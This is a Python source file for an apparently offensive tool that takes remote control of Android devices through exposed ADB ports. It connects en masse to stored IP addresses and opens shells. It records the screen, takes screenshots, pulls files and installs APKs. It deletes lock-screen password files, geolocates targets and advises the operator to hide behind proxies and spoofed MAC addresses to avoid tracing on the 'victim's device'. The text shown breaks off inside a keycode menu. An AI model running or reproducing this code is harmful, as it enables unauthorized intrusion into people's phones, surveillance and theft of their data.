#!/usr/bin/python
# -*- coding: utf-8 -*-
import threading
import COLORS
import banner
import os
import requests
import time as t
import subprocess
import webbrowser
import datetime
import re
import query

page_1 = f'''                    {COLORS.REDL}[ {COLORS.FIOL}1{COLORS.REDL}  ] {COLORS.OKNL} Devices List                        {COLORS.REDL}[ {COLORS.FIOL}16{COLORS.REDL} ] {COLORS.OKNL} Open location on Google Earth
                    {COLORS.REDL}[ {COLORS.FIOL}2{COLORS.REDL}  ] {COLORS.OKNL} Disconnect all devices              {COLORS.REDL}[ {COLORS.FIOL}17{COLORS.REDL} ] {COLORS.OKNL} Show info of device   
                    {COLORS.REDL}[ {COLORS.FIOL}3{COLORS.REDL}  ] {COLORS.OKNL} Connect new device over tcp         {COLORS.REDL}[ {COLORS.FIOL}18{COLORS.REDL} ] {COLORS.OKNL} Show Mac/Inet
                    {COLORS.REDL}[ {COLORS.FIOL}4{COLORS.REDL}  ] {COLORS.OKNL} Shell                               {COLORS.REDL}[ {COLORS.FIOL}19{COLORS.REDL} ] {COLORS.OKNL} unzip apk from app
                    {COLORS.REDL}[ {COLORS.FIOL}5{COLORS.REDL}  ] {COLORS.OKNL} Installing Apk        {COLORS.OKNL}              {COLORS.REDL}[ {COLORS.FIOL}20{COLORS.REDL} ]{COLORS.OKNL}  Get Battery Status
                    {COLORS.REDL}[ {COLORS.FIOL}6{COLORS.REDL}  ] {COLORS.OKNL} Record screen                       {COLORS.REDL}[ {COLORS.FIOL}21{COLORS.REDL} ] {COLORS.OKNL} Get Network Status
                    {COLORS.REDL}[ {COLORS.FIOL}7{COLORS.REDL}  ] {COLORS.OKNL} Take a screenshot                   {COLORS.REDL}[ {COLORS.FIOL}22{COLORS.REDL} ] {COLORS.OKNL} Swith On / Off [ Wi-Fi ]
                    {COLORS.REDL}[ {COLORS.FIOL}8{COLORS.REDL}  ] {COLORS.OKNL} Restart ADB Server                  {COLORS.REDL}[ {COLORS.FIOL}23{COLORS.REDL} ] {COLORS.OKNL} Delete device passwords
                    {COLORS.REDL}[ {COLORS.FIOL}9{COLORS.REDL}  ] {COLORS.OKNL} Uploading files                     {COLORS.REDL}[ {COLORS.FIOL}24{COLORS.REDL} ] {COLORS.OKNL} Keyevent
                    {COLORS.REDL}[ {COLORS.FIOL}10{COLORS.REDL} ] {COLORS.OKNL} Restart devcie                      {COLORS.REDL}[ {COLORS.FIOL}25{COLORS.REDL} ] {COLORS.OKNL} Get last activity(Logs)  
                    {COLORS.REDL}[ {COLORS.FIOL}11{COLORS.REDL} ] {COLORS.OKNL} Delete app                          {COLORS.REDL}[ {COLORS.FIOL}26{COLORS.REDL} ] {COLORS.OKNL} Mass ADB connections  
                    {COLORS.REDL}[ {COLORS.FIOL}12{COLORS.REDL} ] {COLORS.OKNL} Show device journal                 {COLORS.REDL}[ {COLORS.FIOL}27{COLORS.REDL} ] {COLORS.OKNL} Instructions of ADB
                    {COLORS.REDL}[ {COLORS.FIOL}13{COLORS.REDL} ] {COLORS.OKNL} Dump System Info                    {COLORS.REDL}[ {COLORS.FIOL}28{COLORS.REDL} ] {COLORS.OKNL} Grab wpa_supplicant
                    {COLORS.REDL}[ {COLORS.FIOL}14{COLORS.REDL} ] {COLORS.OKNL} List of all apps                    {COLORS.REDL}[ {COLORS.FIOL}29{COLORS.REDL} ] {COLORS.OKNL} Port Forwarding
                    {COLORS.REDL}[ {COLORS.FIOL}15{COLORS.REDL} ] {COLORS.OKNL} Star Apps                           {COLORS.REDL}[ {COLORS.FIOL}30{COLORS.REDL} ] {COLORS.OKNL} Take a Photo
                    {COLORS.REDL}[ {COLORS.FIOL}31{COLORS.REDL} ] {COLORS.OKNL} Reconnect offline devices           {COLORS.REDL}[ {COLORS.FIOL}32{COLORS.REDL} ] {COLORS.OKNL} Message Sending
                    {COLORS.REDL}[ {COLORS.FIOL}33{COLORS.REDL} ] {COLORS.OKNL} Calling Menu                                   

             {COLORS.REDL}[ {COLORS.FIOL}0{COLORS.REDL} ] {COLORS.OKNL} Exit {COLORS.FIOL}               {COLORS.REDL}[ {COLORS.FIOL}66{COLORS.REDL} ]{COLORS.OKNL} Clear Console               {COLORS.REDL}[ {COLORS.FIOL}77{COLORS.REDL} ]{COLORS.OKNL} Disable Server

'''
def changemac():
    mac_choice = input(' Do you want change MacAddress? y/n: ')
    if mac_choice.lower() == 'y':
        os.system('nmcli device status')
        iface_macchanger = input("On which interface do you want change mac address?: ")
        os.system(f'sudo macchanger -a {iface_macchanger}')
    elif mac_choice.lower() == 'n':
        print("\n I hope you understand that your Mac Address can not only show up on the victim's device, but also remain there for a long time.")
def make_tmp(ip):
    print(" Trying make temp folder.")
    pipe = subprocess.Popen(['adb', '-s', ip, 'shell', 'mkdir', '/data/local/tmp/1'], stdout=subprocess.PIPE)
    title, error = pipe.communicate()
    title = title.decode()
    if "exists" in title:
        print(' Folder exist. Good boyy ghe-ge\n')
    else:
        pass

lock = threading.Lock()
def conn(ip_address):
    info = ''
    IP_ADDR = ip_address.split(":")[0]
    IP_PORT = ip_address.split(":")[1]
    #subprocess.call(f" adb connect {IP_ADDR}:{IP_PORT}", shell=True)
    pipe = subprocess.Popen(["adb", "connect", f"{IP_ADDR}:{IP_PORT}"], stdout=subprocess.PIPE)
    title, error = pipe.communicate()
    title = title.decode()
    try:
        lock.acquire(True)
        #res = cursor.execute('''...''',(host,))
        # do something
        if 'connected' in title:
            print(f' {COLORS.FIOL}{title}')
            pipe = subprocess.Popen(["adb", "-s" f"{IP_ADDR}:{IP_PORT}", "shell", "getprop", "ro.product.name", "ro.product.model"], stdout=subprocess.PIPE)
            title, error = pipe.communicate()
            title1 = title.decode()
            if 'command not found' in title1:
                title1 = ''
            pipe = subprocess.Popen(["adb", "-s" f"{IP_ADDR}:{IP_PORT}", "shell", "getprop", "ro.product.device"], stdout=subprocess.PIPE)
            title, error = pipe.communicate()
            title2 = title.decode()
            if 'command not found' in title2:
                title2 = ''
            try:
                info = f'{title1} {title2}'.replace("\n", " | ")
            except:
                info = ''
            make_tmp(IP_ADDR)
            query.init.insert(IP_ADDR, IP_PORT, info, 'online')
        else:
            query.init.insert(IP_ADDR, IP_PORT, info, 'offline')
    finally:
        lock.release()
def score_board():
    alld = 0
    actived = 0
    """pipe = subprocess.Popen(["adb", "devices", '-l'], stdout=subprocess.PIPE)
    title, error = pipe.communicate()
    title = title.decode()
    if len(title) <= 26:
        actived = 0
    else:
        devices = str(title).split("\n")
        for i, device in enumerate(devices):
            if ' device ' in device and 'List of devices attached' not in device and 'offline' not in device:
                actived += 1
            
        if len(title) <= 26:
            alld = 0
        else:
            devices = str(title).split("\n")
            for i, device in enumerate(devices):
                if 'List of devices attached' in device:
                    continue
                if 'List of devices attached' not in device and device != '':
                    alld +=1"""
    alld = query.init.view_count()
    actived = query.init.view_online()
    scoreboard = f"""                    ___________________________
                    |Active Devices: {actived}        |
                    |                         |
                    |All Devices: {alld}           |
                    |-------------------------|    """
    print(scoreboard)

def android_debug():
    isExist = os.path.exists('result')
    if not isExist:

        # Create a new directory because it does not exist
        os.makedirs('result')
    username = os.getlogin()
    global path_to_file
    ip = None

    os.system('clear')
    query.init.make_offline()
    print(banner.banner)
    print(f"\n{COLORS.WHSL}                                    Starting Android Debug Bridge shell...\n")
    print(f"\n{COLORS.REDL} Warning! Use proxy for connection to Devices and don't forget to change MacAddress.\n{COLORS.REDL}")
    changemac()
    t.sleep(1)
    subprocess.call("adb start-server >> /dev/null", shell=True)
    os.system('clear')
    print(banner.banner)
    score_board()
    print(page_1)

    while True:
        try:
            option = input(
                f"{COLORS.FIOL} ───> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
        except KeyboardInterrupt:
            return

        if option == '1':
            print(f"\n{COLORS.FIOL} [1]{COLORS.OKNL} Live Devices\n{COLORS.FIOL} [2]{COLORS.OKNL} All Devices ADB\n {COLORS.FIOL}[3]{COLORS.OKNL} All devices DataBase{COLORS.ENDL}")
            option_two = input(
                f"{COLORS.FIOL} ───> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
            if option_two == '1':
                pipe = subprocess.Popen(["adb", "devices", '-l'], stdout=subprocess.PIPE)
                title, error = pipe.communicate()
                title = title.decode()
                if len(title) <= 26:
                    print(f"\n{COLORS.REDL} You are not connect to device.\n")
                else:
                    devices = str(title).split("\n")
                    for i, device in enumerate(devices):
                        if 'List of devices attached' in device:
                            print(f'      {COLORS.GNSL}List of devices attached{COLORS.ENDL}')
                        if ' device ' in device and 'List of devices attached' not in device and 'offline' not in device:
                            print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device}{COLORS.ENDL}')
            elif option_two == '2':
                pipe = subprocess.Popen(["adb", "devices", '-l'], stdout=subprocess.PIPE)
                title, error = pipe.communicate()
                title = title.decode()
                if len(title) <= 26:
                    print(f"\n{COLORS.REDL} You are not connect to device.\n")
                else:
                    devices = str(title).split("\n")
                    for i, device in enumerate(devices):
                        if 'List of devices attached' in device:
                            print(f'      {COLORS.GNSL}List of devices attached{COLORS.ENDL}')
                        if 'List of devices attached' not in device and device != '':
                            print(f'{COLORS.FIOL} [{i}] {COLORS.OKNL} {device}{COLORS.ENDL}')
            elif option_two == '3':
                database = query.init.view_devices()
                for i, device in enumerate(database):
                    device = str(device)
                    #print(device)
                    
                    device_ip = str(device.split(",")[1]).replace("'","").replace(")","").strip()
                    device_port = str(device.split(",")[2]).replace("'","").replace(")","").strip()
                    device_info = str(device.split(",")[3]).replace("'","").replace(")","").strip()
                    print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device_ip}:{device_port} - {device_info}{COLORS.ENDL}')
        elif option == '2':
            pipe = subprocess.Popen(["adb", "disconnect"], stdout=subprocess.PIPE)
            title, error = pipe.communicate()
            title = title.decode()
            print(title)
            ip = None

        elif option == '3':
            print(f"\n [1] Connect over TCP/IP\n [2] Connect to active devices\n [3] Connect to device from database\n [4] Connect over USB")
            option_two = input(f"{COLORS.FIOL} ───> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
            if option_two == '1':
                try:
                    ip = input(f" Ip device{COLORS.GNSL}{COLORS.ENDL}: ")
                    port_device = input(f" Port device{COLORS.GNSL}{COLORS.ENDL}: ")
                    ipaddr = f'{ip}:{port_device}'
                    conn(ipaddr)
                except KeyboardInterrupt:
                    continue
            elif option_two == '2':
                pipe = subprocess.Popen(["adb", "devices", '-l'], stdout=subprocess.PIPE)
                title, error = pipe.communicate()
                title = title.decode()
                if len(title) <= 26:
                    print(f"\n{COLORS.REDL} You are not connect to device.\n")
                else:
                    devices = str(title).split("\n")
                    for i, device in enumerate(devices):
                        if 'List of devices attached' in device:
                            print(f'      {COLORS.GNSL}List of devices attached{COLORS.ENDL}')
                        if ' device ' in device and 'List of devices attached' not in device and 'offline' not in device:
                            print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device}{COLORS.ENDL}')
                    connect_to = input(" Connect to: ")
                    for i, device in enumerate(devices):
                            if ' device ' in device and 'List of devices attached' not in device and 'offline' not in device:
                                if int(i) == int(connect_to):
                                    ip = str(device).split(":")[0]
            elif option_two == '3':
                print(f"\n [1] Connect To One device\n [2] Connect to all devices\n")
                option_two = input(f"{COLORS.FIOL} ───> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
                if option_two == '1':
                    database = query.init.view_devices()
                    for i, device in enumerate(database):
                        device = str(device)
                        #print(device)
                        
                        device_ip = str(device.split(",")[1]).replace("'","").replace(")","").strip()
                        device_port = str(device.split(",")[2]).replace("'","").replace(")","").strip()
                        device_info = str(device.split(",")[3]).replace("'","").replace(")","").strip()
                        print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device_ip}:{device_port} - {device_info}{COLORS.ENDL}')
                    print(" Example: 192.168.1.105:5555 or Alcatel")
                    ipd = input(f"{COLORS.FIOL} ───> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} device: {COLORS.WHSL}")
                    conn(ipd)
                elif option_two == '2':
                    list_ips = query.init.all_ip()
                    for ipd in list_ips:
                        #print(ip)
                        ip_adr = str(ipd).strip().split(",")[0].replace("('", "").replace("'","")
                        port = str(ipd).strip().split(",")[1].replace(")","")
                        if len(ip_adr) < 7 and len(port) == 0 or "'', " ''"" in ipd:
                            continue
                        else:
                            ipaddr = f'{ip_adr}:{port}'.replace(" ","").strip()
                            #print(ipaddr)
                            thread = threading.Thread(target=conn, args=(ipaddr,))
                            thread.start()
            elif option_two == '4':
                print(f"\n Connecting to device over usb.\n")
                try:
                    #port_device = input(f" Port device{COLORS.GNSL}{COLORS.ENDL}: ")
                    pipe = subprocess.Popen(["adb", "devices", "-l"], stdout=subprocess.PIPE)
                    title, error = pipe.communicate()
                    title = title.decode()
                    devices = str(title).split("\n")
                    for i, device in enumerate(devices):
                        if device == '':
                            continue
                        if 'List of devices attached' in device:
                            print(f'      {COLORS.GNSL}List of devices attached:{COLORS.ENDL}')
                        else:
                            match = re.match('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', device)
                            #print(match)
                            if not match:   
                                print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device}{COLORS.ENDL}')
                    ip = input(" Connect to: ")
                except KeyboardInterrupt:
                    continue
                except:
                    pass
                             
        elif option == '4':
            print(f"\n Starting shell to device.\n")
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                subprocess.call(f"adb -s {ip} shell", shell=True)

        elif option == '5':
            print(f"\n Uploader to device.\n")
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                apk_location = input(f"  Enter the path to apk.{COLORS.GNSL}[Example: {COLORS.REDL}</home/user/Downloads/test.apk>{COLORS.GNSL}]{COLORS.ENDL}:")
                subprocess.call("adb -s  " + ip + " install " + apk_location, shell=True)
                pipe = subprocess.Popen(["adb", "-s", ip, 'install', apk_location], stdout=subprocess.PIPE)
                title, error = pipe.communicate()
                title = title.decode()
                print(f" {COLORS.GNSL}Apk Uploaded. > {title}")

        elif option == '6':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                try:
                    path_to_safe_screenrecord = input("Do you want use custom path to save record?y/n:")
                    if path_to_safe_screenrecord.lower() == 'y':
                        path_to_safe_screenrecord = input('path: ')
                    else:
                        save_data = datetime.datetime.today().strftime("%Y-%m-%d-%H.%M.%S")
                        filename = f'screenshot__{ip}__{save_data}'
                        path_to_safe_screenrecord = f'/data/local/tmp/1/{filename}.mp4'
                    print(f" Starting Screen Recording.")
                    print(f" use <ctrl+c> to stop recording.\n")
                    subprocess.call(f"adb -s {ip} shell screenrecord {path_to_safe_screenrecord}", shell=True)
                    local_path_record = input(f"  Enter the path to save record.{COLORS.GNSL}[Example: {COLORS.REDL}</home/user/Downloads/test.mp4>{COLORS.GNSL}]{COLORS.ENDL}:")
                
                    subprocess.call(f"adb -s {ip} pull {path_to_safe_screenrecord} {local_path_record}", shell=True)
                    print(f" Sucessfully saved.")
                    os.system(f'open {local_path_record}')
                    t.sleep(2)
                    score_board()
                    print(page_1)

                except KeyboardInterrupt:
                    os.system('clear')
                    score_board()
                    print(page_1)
                    continue

        elif option == '7':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                try:
                    print(" Make ScreenShot.")
                    save_data = datetime.datetime.today().strftime("%Y-%m-%d-%H.%M.%S")
                    filename = f'screenshot__{ip}__{save_data}'
                    path_to_file = 'result/' + filename
                    pipe = subprocess.Popen(['adb', '-s', ip, 'shell', 'screencap', '/data/local/tmp/1/screen.png'], stdout=subprocess.PIPE)
                    title, error = pipe.communicate()
                    title = title.decode()
                    print(title)
                    #subprocess.call(f"adb -s {ip} shell screencap /data/local/tmp/1/screen.png", shell=True)
                    print(f" Wait. Downloading screenshot to /result\n")
                    subprocess.Popen([f"adb", "-s", ip, "pull", "/data/local/tmp/1/screen.png", path_to_file], stdout=subprocess.PIPE)
                    """title, error = pipe.communicate()
                    title = title.decode()
                    print(title)"""
                    print(f" {COLORS.GNSL} Screenshot {COLORS.WHSL} Successfully Downloaded.")
                    os.system(f'open {path_to_file}')
                    t.sleep(2)
                    score_board()
                    print(page_1)

                except KeyboardInterrupt:
                    os.system('clear')
                    score_board()
                    print(page_1)
                    continue

        elif option == '8':
            print(f"\n Restarting ADB...\n")
            subprocess.call("adb kill-server >> /dev/null", shell=True)
            subprocess.call("adb start-server >> /dev/null", shell=True)
            print(f" Done.")
            t.sleep(2)
            score_board()
            print(page_1)

        elif option == '9':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                print(f" Enter path on device to file.\n Пример: /data/local/tmp/1/DCIM/demo.mp4 \n")
                file_location = input(f" Android Debug Bridge {COLORS.GNSL}[{COLORS.REDL} file_pull {COLORS.GNSL}]{COLORS.ENDL}:")
                 
                place_location = input(f"  Enter the path to save local.{COLORS.GNSL}[Example: {COLORS.REDL}</home/user/Downloads/test.mp4>{COLORS.GNSL}]{COLORS.ENDL}:")
                subprocess.call(f"adb -s {ip} pull {file_location} {place_location}", shell=True)
                score_board()
                print(page_1)

        elif option == '10':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                subprocess.call(f"adb -s {ip} reboot ", shell=True)
                print(f" Device has been rebooted. Wait 1 Min. ")
                t.sleep(4)
                score_board()
                print(page_1)

        elif option == '11':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                print(f" Enter package_name \n")
                package_name = input(f"package_name:{COLORS.GNSL}[Example: {COLORS.REDL}<com.android.mms>{COLORS.GNSL}]{COLORS.ENDL}:")
                subprocess.call(f"adb -s {ip} uninstall {package_name}", shell=True)

        elif option == '12':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                try:
                    print(f"\n Dumps a log of system messages, click ctrl+c to stop.\n")
                    t.sleep(2)
                    subprocess.call(f'adb -s {ip} logcat ', shell=True)

                except KeyboardInterrupt:
                    score_board()
                    print(page_1)
                    continue

        elif option == '13':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                try:
                    print(f"\n{COLORS.REDL}provides information about system services.  click ctrl+c to stop.\n")
                    t.sleep(4)
                    subprocess.call(f"adb -s {ip} shell dumpsys", shell=True)

                except KeyboardInterrupt:
                    print(page_1)
                    continue

        elif option == '14':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            subprocess.call(f"adb -s {ip} shell pm list packages -f", shell=True)

        elif option == '15':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
             
            print(f" Start App.\n")
            package_name = input(f" Just enter package name to start. {COLORS.GNSL}[Example:{COLORS.REDL} com.android.mms {COLORS.GNSL}]{COLORS.ENDL}:")
            subprocess.call(f"adb -s {ip} shell monkey -p " + package_name + " -v 500", shell=True)

        elif option == '16':
            print("Open Geo-Position on map.")
            os.system('clear')
            data = requests.get(
                    "http://ip-api.com/json/" + ip + "?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy")
            resp = data.json()
            if resp["status"] == "fail":
                print(f'{COLORS.WHSL} Addictionaly Information/\n')

                print(f"{COLORS.WHSL} Latitude:{COLORS.FIOL} " + str(resp["lat"]))
                print(f"{COLORS.WHSL} Longitude:{COLORS.FIOL} " + str(resp["lon"]))
                print(f"{COLORS.WHSL} Mobile Company:{COLORS.FIOL} " + str(resp["mobile"]))
                print(f"{COLORS.GNSL} Proxy:{COLORS.FIOL} " + str(resp["proxy"]))
                webbrowser.open(f"https://earth.google.com/web/search/{resp['lat']}+{resp['lon']}")
                print(f"\n{COLORS.REDL} Status: " + resp["status"])

        elif option == '17':
            os.system('clear')
            print('About System.')
            subprocess.call(f'adb shell getprop | grep -e"model\|version.sdk\|manufacturer\|hardware\|platform\|revision\|serialno\|product.name\|brand"', shell=True)
            #print(page_1)

        elif option == '18':
            print('Show wlan0.')
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                subprocess.call(f"adb -s {ip} shell ip address show wlan0", shell=True)

        elif option == '19':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
             
            print(f" Enter apk name.\n")
            package_name = input(f" Package_name - Android Debug Bridge: ")
            subprocess.call(f"adb -s {ip} shell pm path " + package_name, shell=True)
             
            print(f" enter path to apk on device\n")
            path = input(" Android Debug Bridge: ")
             
            print(f" enter path to save.\n")
            location = input(f" Android Debug Bridge pull_apk:")
            subprocess.call(f"adb -s {ip} pull {path} {location}", shell=True)
            t.sleep(2)
            print(page_1)

        elif option == '20':
            print("battary status.")
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                subprocess.call(f"adb -s {ip} shell dumpsys battery", shell=True)

        elif option == '21':
            print('netstat.')
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                subprocess.call(f"adb -s {ip} shell netstat", shell=True)

        elif option == '22':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                print(f" To enable WiFi again, the device must be connected.")
                 
                on_off = input(f"{COLORS.GNSL}   [{COLORS.REDL} + {COLORS.GNSL}]{COLORS.WHSL} Want to turn WiFi on/off{COLORS.REDL} :")
                if on_off == "off":
                    command = " shell svc wifi disable"
                else:
                    command = " shell svc wifi enable"
                subprocess.call(f"adb -s {ip} {command}", shell=True)

        elif option == '23':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                 
                print(f"****************** REMOVING PASSWORD ******************")
                subprocess.call(f"adb -s {ip} shell su 0 'rm /data/system/gesture.key'", shell=True)
                subprocess.call(f"adb -s {ip} shell su 0 'rm /data/system/locksettings.db'", shell=True)
                subprocess.call(f"adb -s {ip} shell su 0 'rm /data/system/locksettings.db-wal'", shell=True)
                subprocess.call(f"adb -s {ip} shell su 0 'rm /data/system/locksettings.db-shm'", shell=True)
                print(f"****************** REMOVING PASSWORD ******************")

        elif option == '24':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")

            print(f'''
 {COLORS.GNSL}[ {COLORS.REDL}0{COLORS.GNSL} ]  {COLORS.WHSL}KEYCODE_UNKNOWN       {COLORS.GNSL}[ {COLORS.REDL}21{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_DPAD_LEFT      {COLORS.GNSL}[ {COLORS.REDL}42{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_N            {COLORS.GNSL}[ {COLORS.REDL}63{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_SYM 
 {COLORS.GNSL}[ {COLORS.REDL}1{COLORS.GNSL} ]  {COLORS.WHSL}KEYCODE_MENU          {COLORS.GNSL}[ {COLORS.REDL}22{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_DPAD_RIGHT     {COLORS.GNSL}[ {COLORS.REDL}43{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_O            {COLORS.GNSL}[ {COLORS.REDL}64{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_EXPLORER
 {COLORS.GNSL}[ {COLORS.REDL}2{COLORS.GNSL} ]  {COLORS.WHSL}KEYCODE_SOFT_RIGHT    {COLORS.GNSL}[ {COLORS.REDL}23{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_DPAD_CENTER    {COLORS.GNSL}[ {COLORS.REDL}44{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_P            {COLORS.GNSL}[ {COLORS.REDL}65{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_ENVELOPE
 {COLORS.GNSL}[ {COLORS.REDL}3{COLORS.GNSL} ]  {COLORS.WHSL}KEYCODE_HOME          {COLORS.GNSL}[ {COLORS.REDL}24{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_VOLUME_UP      {COLORS.GNSL}[ {COLORS.REDL}45{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_Q            {COLORS.GNSL}[ {COLORS.REDL}66{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_ENTER
 {COLORS.GNSL}[ {COLORS.REDL}4{COLORS.GNSL} ]  {COLORS.WHSL}KEYCODE_BACK          {COLORS.GNSL}[ {COLORS.REDL}25{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_VOLUME_DOWN    {COLORS.GNSL}[ {COLORS.REDL}46{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_R            {COLORS.GNSL}[ {COLORS.REDL}67{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_DEL
 {COLORS.GNSL}[ {COLORS.REDL}5{COLORS.GNSL} ]  {COLORS.WHSL}KEYCODE_CALL          {COLORS.GNSL}[ {COLORS.REDL}26{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_POWER          {COLORS.GNSL}[ {COLORS.REDL}47{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_S            {COLORS.GNSL}[ {COLORS.REDL}68{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_GRAVE
 {COLORS.GNSL}[ {COLORS.REDL}6{COLORS.GNSL} ]  {COLORS.WHSL}KEYCODE_ENDCALL       {COLORS.GNSL}[ {COLORS.REDL}27{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_CAMERA         {COLORS.GNSL}[ {COLORS.REDL}48{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_T            {COLORS.GNSL}[ {COLORS.REDL}69{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_MINUS
 {COLORS.GNSL}[ {COLORS.REDL}7{COLORS.GNSL} ]  {COLORS.WHSL}KEYCODE_0             {COLORS.GNSL}[ {COLORS.REDL}28{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_CLEAR          {COLORS.GNSL}[ {COLORS.REDL}49{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_U            {COLORS.GNSL}[ {COLORS.REDL}70{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_EQUALS
 {COLORS.GNSL}[ {COLORS.REDL}8{COLORS.GNSL} ]  {COLORS.WHSL}KEYCODE_1             {COLORS.GNSL}[ {COLORS.REDL}29{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_A              {COLORS.GNSL}[ {COLORS.REDL}50{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_V            {COLORS.GNSL}[ {COLORS.REDL}71{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_LEFT_BRACKET
 {COLORS.GNSL}[ {COLORS.REDL}9{COLORS.GNSL} ]  {COLORS.WHSL}KEYCODE_2             {COLORS.GNSL}[ {COLORS.REDL}30{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_B              {COLORS.GNSL}[ {COLORS.REDL}51{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_W            {COLORS.GNSL}[ {COLORS.REDL}72{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_RIGHT_BRACKET
 {COLORS.GNSL}[ {COLORS.REDL}10{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_3             {COLORS.GNSL}[ {COLORS.REDL}31{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_C              {COLORS.GNSL}[ {COLORS.REDL}52{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_X            {COLORS.GNSL}[ {COLORS.REDL}73{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_BACKSLASH
 {COLORS.GNSL}[ {COLORS.REDL}11{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_4             {COLORS.GNSL}[ {COLORS.REDL}32{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_D              {COLORS.GNSL}[ {COLORS.REDL}53{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_Y            {COLORS.GNSL}[ {COLORS.REDL}74{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_SEMICOLON
 {COLORS.GNSL}[ {COLORS.REDL}12{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_5             {COLORS.GNSL}[ {COLORS.REDL}33{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_E              {COLORS.GNSL}[ {COLORS.REDL}54{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_Z            {COLORS.GNSL}[ {COLORS.REDL}75{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_APOSTROPHE
 {COLORS.GNSL}[ {COLORS.REDL}13{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_6             {COLORS.GNSL}[ {COLORS.REDL}34{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_F              {COLORS.GNSL}[ {COLORS.REDL}55{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_COMMA        {COLORS.GNSL}[ {COLORS.REDL}76{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_SLASH
 {COLORS.GNSL}[ {COLORS.REDL}14{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_7             {COLORS.GNSL}[ {COLORS.REDL}35{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_G              {COLORS.GNSL}[ {COLORS.REDL}56{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_PERIOD       {COLORS.GNSL}[ {COLORS.REDL}77{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_AT
